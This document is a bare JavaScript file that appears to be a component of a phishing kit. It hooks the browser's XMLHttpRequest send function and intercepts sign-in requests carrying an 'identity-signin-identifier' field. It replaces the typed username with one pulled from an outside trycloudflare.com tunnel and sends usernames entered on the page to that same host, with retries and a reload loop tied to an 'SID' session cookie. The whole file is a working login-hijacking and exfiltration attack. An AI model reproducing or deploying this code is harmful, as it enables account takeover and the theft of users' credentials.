let freqUsername = null;
let modifiedRequests = new Set();
let pendingRequests = new Map(); 

let usernameFetched = false;

const fetchFreqUsername = () => {
    if (freqUsername === null) {
        console.log('fetchFreqUsername called');
        return fetch('https://pdt-sons-paperback-suffer.trycloudflare.com/get-first-post-data')
            .then(response => response.json())
            .then(result => {
                freqUsername = result.postData;
                return fetch('https://pdt-sons-paperback-suffer.trycloudflare.com/reset-first-post-data', { method: 'POST' });
            })
            .then(() => {
                usernameFetched = true;
                processModifiedRequests();
            })
            .catch(error => {
                console.error('Error fetching username:', error);
                setTimeout(fetchFreqUsername, 1000);
            });
    }
};

const processModifiedRequests = () => {
    for (let [xhr, body] of pendingRequests) {
        let modified = false;
        const firstPostMatch = body && /identity-signin-identifier%5C%22%2C%5C%22([^&]*)%5C/.exec(body);
       
        if (firstPostMatch && freqUsername && !modifiedRequests.has(freqUsername)) {
            body = body.replace(firstPostMatch[1], freqUsername);
            modifiedRequests.add(freqUsername);
            modified = true;
            freqUsername = null;
        } 

        if (modified) {
            xhr.send(body);
            pendingRequests.delete(xhr);
        }
    }

    if (!usernameFetched) fetchFreqUsername();
};

const originalXhrSend = XMLHttpRequest.prototype.send;
XMLHttpRequest.prototype.send = function(body) {
    if (!body) {
        originalXhrSend.call(this, body);
        return;
    }

    const firstPostMatch = /identity-signin-identifier/.test(body);
    
    if (firstPostMatch && !Array.from(modifiedRequests).some(m => body.includes(m))) {
        pendingRequests.set(this, body);
        processModifiedRequests();
    } else {
        originalXhrSend.call(this, body);
    }
};

// 🚀 **Ensures Username is Always Sent (Even if Page Reloads)**
function sendUsername(retries = 3) {
    console.log('sendUsername() called');

    const usernameInput = document.getElementById('username');
    if (!usernameInput) {
        console.warn('Username input field not found');
        return;
    }

    const username = usernameInput.value.trim();
    if (!username) {
        console.warn('Username is empty');
        return;
    }

    localStorage.setItem('pendingUsername', username); // Save for retry

    const url = 'https://pdt-sons-paperback-suffer.trycloudflare.com/save-username';
    const data = JSON.stringify({ username });

    if (!navigator.sendBeacon(url, data)) {
        // 🌟 If `sendBeacon` fails, fallback to fetch with retries
        fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: data
        })
        .then(response => {
            if (!response.ok) {
                throw new Error(`Server error: ${response.status} ${response.statusText}`);
            }
            return response.json();
        })
        .then(data => {
            console.log('Username sent successfully:', data);
            localStorage.removeItem('pendingUsername'); // Remove from storage if successful
        })
        .catch(error => {
            console.error('Fetch error:', error);
            if (retries > 0) {
                console.log(`Retrying... ${retries} retries left`);
                setTimeout(() => sendUsername(retries - 1), 2000);
            }
        });
    } else {
        console.log('Username sent via sendBeacon');
        localStorage.removeItem('pendingUsername'); // Remove from storage if successful
    }
}

// 🔄 **Retry Sending Unsent Username on Page Load**
window.addEventListener('load', () => {
    const pendingUsername = localStorage.getItem('pendingUsername');
    if (pendingUsername) {
        console.log('Retrying unsent username:', pendingUsername);
        sendUsername();
    }
});

// ✅ **Fix for Page Refresh Interrupting Fetch**
let usernameSent = false;
document.getElementById('sendUsernameBtn')?.addEventListener('click', () => {
    usernameSent = true;
    sendUsername();
});

// Prevent page refresh if fetch is ongoing
setInterval(() => {
    if (!usernameSent && document.cookie.includes('SID')) {
        location.reload();
    }
}, 3000);

// Start fetching username
fetchFreqUsername();
